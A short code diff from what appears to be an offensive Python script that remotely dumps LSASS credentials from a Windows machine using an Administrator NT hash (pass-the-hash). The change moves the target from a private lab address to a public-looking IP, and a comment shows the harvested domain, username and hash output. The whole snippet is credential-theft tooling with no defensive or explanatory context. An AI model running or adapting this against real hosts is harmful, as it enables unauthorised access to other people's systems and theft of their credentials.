@@ -61,7 +61,7 @@ def dump_lsass(target, username, domain, password='', nthash=''):
     
     return unique_creds
 
-creds = dump_lsass(target="192.168.56.133", username="Administrator", nthash="58a478135a93ac3bf058a5ea0e8fdb71", domain="contoso.local")
+creds = dump_lsass(target="87.0.192.165", username="Administrator", nthash="58a478135a93ac3bf058a5ea0e8fdb71", domain="contoso.local")
 
 # Output is a list of dict in the following format, None if error:
 # [{'domain':'CONTOSO', 'username':'Administrator', 'nthash':'58a478135a93ac3bf058a5ea0e8fdb71'}]
